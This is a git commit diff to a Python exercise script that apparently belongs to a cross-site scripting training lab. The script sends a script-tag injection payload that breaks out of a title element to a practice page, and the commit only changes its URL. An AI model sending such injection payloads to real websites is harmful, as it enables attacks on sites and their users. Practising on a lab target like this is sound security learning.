7e68e238fd9850604ad172e00e7a853082ad93ec
Nguyen Diep Anh <102238853+Weep2609@users.noreply.github.com>
2023-02-26 22:38:07 +0700

    Update exercise_01.py

--- brutelogic_lab/exercise_01.py
+++ brutelogic_lab/exercise_01.py
@@ -1,7 +1,7 @@
 #!/usr/bin/python3
 import requests
 
-url = "https://brutelogic.com.br/gym.php?p01=title"
+url = "https://brutelogic.com.br/gym.php"
 payload = {'p01': '</title><script>alert(1)</script><title>'}
 
 r = requests.get(url, params=payload)
